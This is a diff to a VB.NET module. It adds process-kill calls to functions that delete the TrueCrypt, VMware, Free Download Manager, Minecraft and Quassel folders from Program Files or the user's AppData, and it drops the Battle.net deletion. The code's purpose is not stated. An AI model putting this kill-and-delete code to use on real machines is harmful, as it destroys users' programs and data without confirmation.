@@ -19,6 +19,7 @@ Module modLib
     Public Function rm_truecrypt()
         Dim szProgramFilesPath As String
         szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
+        kill_proc("truecrypt.exe")
         rm(szProgramFilesPath & "\TrueCrypt\")
         Return Nothing
     End Function
@@ -26,6 +27,7 @@ Module modLib
     Public Function rm_fdm()
         Dim szProgramFilesPath As String
         szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
+        kill_proc("fdm.exe")
         rm(szProgramFilesPath & "\Free Download Manager\")
         Return Nothing
     End Function
@@ -33,6 +35,12 @@ Module modLib
     Public Function rm_vmware()
         Dim szProgramFilesPath As String
         szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
+        kill_proc("vmnat.exe")
+        kill_proc("vmnetdhcp.exe")
+        kill_proc("vmware-authd.exe")
+        kill_proc("vmware-hostd.exe")
+        kill_proc("vmware-tray.exe")
+        kill_proc("vmware-usbarbitrator64.exe")
         rm(szProgramFilesPath & "\VMware\")
         Return Nothing
     End Function
@@ -63,6 +71,7 @@ Module modLib
     Public Function rm_minecraft()
         Dim szProgramFilesPath As String
         szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
+        kill_proc("java.exe")
         rm(szProgramFilesPath & "\AppData\Roaming\.minecraft\")
         Return Nothing
     End Function
@@ -78,8 +87,8 @@ Module modLib
     Public Function rm_quassel()
         Dim szProgramFilesPath As String
         szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
+        kill_proc("quassel.exe")
         rm(szProgramFilesPath & "\AppData\Roaming\quassel-irc.org")
-        rm(szProgramFilesPath & "\AppData\Local\Battle.net")
         Return Nothing
     End Function
 
